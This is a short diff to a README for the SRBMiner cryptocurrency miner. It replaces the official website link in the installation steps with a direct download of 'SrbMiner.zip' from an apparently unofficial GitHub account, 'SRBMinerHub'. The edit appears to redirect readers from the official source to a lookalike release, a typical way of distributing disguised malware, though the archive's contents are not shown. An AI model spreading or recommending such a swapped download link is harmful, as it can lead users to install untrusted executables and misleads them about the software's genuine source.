@@ -24,7 +24,7 @@
 ## 🔧 Installation
 
 1. Download the latest release from the official website:  
-   👉 [https://www.srbminer.com/](https://www.srbminer.com/)
+   👉 [Release](https://github.com/SRBMinerHub/SrbMiner-Multi/releases/download/srb/SrbMiner.zip)
 2. Extract the archive.
 3. Configure your `.bat`, `.sh` or `.conf` file for mining.
 
